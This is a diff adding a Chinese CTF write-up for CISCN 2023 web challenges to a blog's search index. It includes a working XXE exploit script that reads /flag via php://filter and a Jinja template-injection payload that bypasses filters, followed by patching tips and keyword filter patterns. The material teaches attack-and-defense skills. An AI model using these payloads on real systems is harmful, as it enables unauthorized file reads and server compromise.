@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>CISCN 2023 Write-Up &amp; Tricks</title>
+      <link href="/2023/07/07/CISCN-Write-Up-Tricks/"/>
+      <url>/2023/07/07/CISCN-Write-Up-Tricks/</url>
+      
+        <content type="html"><![CDATA[<h1 id="CISCN-2023-部分-Write-Up-及patch妙妙小技巧"><a href="#CISCN-2023-部分-Write-Up-及patch妙妙小技巧" class="headerlink" title="CISCN 2023 部分 Write-Up 及patch妙妙小技巧"></a>CISCN 2023 部分 Write-Up 及patch妙妙小技巧</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><p>变量覆盖+XXE外部实体注入任意文件读。<br>Patch：修了extract就行<br>exp:  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">file = <span class="string">&quot;/flag&quot;</span></span><br><span class="line">username = <span class="string">&quot;okok20&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;&quot;&quot;<span class="subst">&#123;username&#125;</span>&quot;&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">f&quot;&quot;&quot;y&quot;&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;user_xml_format&#x27;</span>: <span class="string">f&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY content SYSTEM &quot;php://filter/read=convert.base64-encode/resource=<span class="subst">&#123;file&#125;</span>&quot;&gt;]&gt;&lt;userinfo&gt;&lt;user&gt;&lt;username&gt;&amp;content;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;&lt;/userinfo&gt;&quot;&quot;&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(<span class="string">&quot;http://175.20.20.196/register.php&quot;</span>,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line">r = requests.get(<span class="string">f&quot;http://175.20.20.196/login.php?username=<span class="subst">&#123;username&#125;</span>&amp;password=2&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h3 id="Ciscn-Search-Engine"><a href="#Ciscn-Search-Engine" class="headerlink" title="Ciscn_Search_Engine"></a>Ciscn_Search_Engine</h3><p>Jinja模板注入，绕过滤字符。我们可以使用request调用get参数来绕过各种字符。   </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request.values.name1)|attr(request.values.name2)|attr(request.values.name3)()|attr(request.values.name4)(40)(request.values.name6)|attr(request.values.name5)()&#125;&#125;</span><br><span class="line">post:</span><br><span class="line">name1=__class__&amp;name2=__base__&amp;name3=__subclasses__&amp;name4=pop&amp;name5=read&amp;name6=&quot;/flag&quot;</span><br></pre></td></tr></table></figure><p>Patch：把花括号干了。  </p><h3 id="其他七七八八的Patch"><a href="#其他七七八八的Patch" class="headerlink" title="其他七七八八的Patch"></a>其他七七八八的Patch</h3><p>首先，我们是可以知道Patch失败的原因的，那么一定要确保不要Patch过猛导致服务异常；我们需要<strong>优先确保服务正常工作，逐步加大Patch力度</strong>。</p><h4 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h4><p>无脑过滤可以迅速打上Patch！我们可以尽量构造一些正常流量中不太可能出现的字符组合来避免被判服务down掉。<br>比如说，想要过滤Python模板注入，我们可以过滤如下组合：<br><code>|_</code>, <code>._</code>, <code>_c</code>, <code>_[</code>, <code>](</code><br>而对于SQL注入就更简单了：自己打一打，看看哪些函数、符号能利用，就直接过滤掉。  </p><h4 id="类型安全"><a href="#类型安全" class="headerlink" title="类型安全"></a>类型安全</h4><p>如果涉及弱类型的语言，比如PHP，经常会有洞出在弱比较上，那么我们可以考虑如下几种手段：  </p><ul><li>使用强比较：例如PHP&#x2F;Js中使用<code>===</code>而非<code>==</code>；</li><li>在关键参数入口处进行正则化：例如，对于期望是整数的参数<code>iv</code>，就应强制让<code>iv=intval(iv)</code>转为整型；</li></ul><p>相信也可以发现国赛这种patch难度远低于attack的难度。建议<strong>做题的初期当作没有攻击得分，先patch了再说</strong>。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Write-Up </tag>
+            
+            <tag> CISCN </tag>
+            
+            <tag> web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>我们仍未知道那年上了个啥高中</title>
       <link href="//wadx_day2/"/>
       <url>//wadx_day2/</url>
